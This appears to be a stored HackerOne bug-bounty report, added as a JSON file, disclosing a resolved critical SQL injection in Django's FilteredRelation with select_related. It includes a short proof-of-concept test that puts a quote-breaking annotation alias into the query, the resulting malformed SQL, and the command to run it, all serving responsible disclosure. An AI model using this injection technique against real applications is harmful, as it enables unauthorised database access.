@@ -1,0 +1,127 @@
+{
+  "id": 3292573,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjkyNTcz",
+  "url": "https://hackerone.com/reports/3292573",
+  "title": "SQL Injection when using FilteredRelation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2025-08-09T00:54:43.902Z",
+  "submitted_at": "2025-08-09T00:54:44.129Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "eyalsec",
+    "url": "/eyalsec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e81bjuda1ps85pdkb7pqcxrjxo7l/3c1a98c0f7063b87f1b854d7726055dea11380ea4e3e58dafddd3ea40bca0679"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23,
+    "url": "https://hackerone.com/django",
+    "handle": "django",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/3c1a98c0f7063b87f1b854d7726055dea11380ea4e3e58dafddd3ea40bca0679",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/df848bf230fe1cd5dd26f571b8f1d0ea918f57c041901f0ae53ebe6f36c62f0a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Django",
+      "twitter_handle": null,
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-09-15T14:01:21.989Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-09-12T01:22:50.821Z",
+  "team_member_agreed_on_going_public_at": "2025-09-15T14:01:21.842Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Django team :)\n\nVulnerability location:\nhttps://github.com/django/django/blob/main/tests/filtered_relation/tests.py#L124\n\nYou may create my POC function above the \"test_select_related_foreign_key\" function:\n```\n    def test_select_related_foreign_key_sqli(self):\n        user_data = \"author_join2\\\"\"\n\n        qs = (\n            Book.objects.annotate(**{\n                user_data: FilteredRelation(\"author\"),\n        })\n            .select_related(user_data)\n        )\n\n        qs._fetch_all()\n```\n\nSQL Query:\n`SELECT \"filtered_relation_book\".\"id\", \"filtered_relation_book\".\"title\", \"filtered_relation_book\".\"author_id\", \"filtered_relation_book\".\"editor_id\", \"filtered_relation_book\".\"number_editor\", \"filtered_relation_book\".\"editor_number\", \"filtered_relation_book\".\"state\", author_join2\".\"id\", author_join2\".\"name\", author_join2\".\"content_type_id\", author_join2\".\"object_id\" FROM \"filtered_relation_book\" INNER JOIN \"filtered_relation_author\" author_join2\" ON (\"filtered_relation_book\".\"author_id\" = author_join2\".\"id\")`\n\n{F4660052}\n\nTo execute the SQLI  you may run:\n`python3 django/tests/runtests.py filtered_relation.tests.FilteredRelationTests.test_select_related_foreign_key_sqli`\n\n## Impact\n\nThe impact is direct SQL Injection for any user with access to `select_related(` as above.\n\nI hope you have a great day!!!\n\nEyal :)",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4660052,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/950evbdcvxvgm89cerzv59rcdyz4?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQMAHG6OZ%2F20250915%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250915T141508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEP3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDfs9XjmqZ9ME%2Bopj4M0tqwHBXZ%2BcGmBb02Gh%2BIPjtmwwIhANrQEfyZNG6tVGKhxQqc9U9xnmIr6znaZQqVXnNwZzSzKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgzpXzSJTDPIdEpQK0oqjgUgg1RdG5YAjxiqgpxbB9cK2Zr%2FvCoFBzI9mCGWvsjUQSumrx8GG7QjS3DGWOTqmCRIDR3rwB3PtPunOXQ7EHz85F2cYpxqx7Dwqlk%2BuiWeDrS7rE0YgDf3ylfCz0vJEp8s5do6pzor9dPC5xgxnV%2B5rYr%2FcINyOybQV1FM1HP9QaGJ%2FJ2Bkd7QeXu%2Bh7OY96pz%2FXuuzkrHM9SAqH0ojcICBJ%2FvV%2BrWOmERFRhkqG3jtfS40kdb6HzegXt0eP%2BWnaMOvDyAA9lFmMMPaBrZ3h4HjDNutzs9xAAntibljUNCt8g9iJmtktc%2FELyPnOQQ%2FJTh83tqbTks%2BuveBJJtA84EwNbHJ4e3nSKs3T%2FM7qRk8%2Fjl23NM7TFJm2%2FrnA7VaEw6JbgFE6yndh93ItagZ%2BYwlBUBotsAHQhQNnWilrLfPVKq%2B0E0sIVQmgbwJz%2BefGrZwF88GIhiMn6%2B02FcOtXa0t3iZQ5acHHuzvsDoxzyjddDyEdmmcxyidGt%2FEw%2BM5oroYXUWxJ3AIh654uY0UaTHjHXVsNtvi1OzQqSpoCHKEoCdo%2BRRjBO4mkMZv1T0McQGY%2FMRmpc02tXUUKLKB8aVCyO3Cpv4ev18cdpX6CpO6PLXIZOe66kgI25WqUYegR0khRZEn9ZNKgvcAvtw00ALZW1e7T3S8HjKyTZAKeu93PNhkdfRbrapNo1DLRz4ZErQR5ZZbeyywOM7A3QAx7b1BCAhD6bklzDbkO5Mzqj9odppma%2BFOQORHgF%2FPj%2F2Ur8NCWJb%2BmIlUWCyOeYT5HkL76FrLMZSr%2B%2Fp9unbT%2BJkAsyu%2FnaC3uudME%2BAIvd%2BJONmg7zpHYDSpt%2F4IRfg1oqtJZPsWNNMozHrILy2t0wx4igxgY6sAF10tjbcr90BO7xKGqZkjmozgtnpqOW0dMLTKIsU%2Fi1BJcmxYAXOlbf17mRcHqO6q8t6PdWsXCzXYInIAhwH1NW9YqFChTXP%2BNeyTqTuGXEvkPYY8GhztGAmmHUv6DIFh0SqNRa7DAvJLF0fWCMB2g90kxB6pWJ0cTMubXq3ViavSA9em%2FZpDAHUZi6BmzxvrlPdMmOUdnhqWT6bzv6Ii1B2pIbtEr%2BXuKE0qQ%2BgLs0Ow%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff7902fa38b0343c3a3192b7fe5b024e49d30adb2fcaeaa6b20f34919a578394",
+      "file_size": 30513,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-10-12T01:22:50.886Z",
+  "allow_singular_disclosure_after": 2286461.910132175,
+  "singular_disclosure_allowed": false,
+  "vote_count": 2,
+  "voters": [
+    "2026",
+    "eyalsec"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
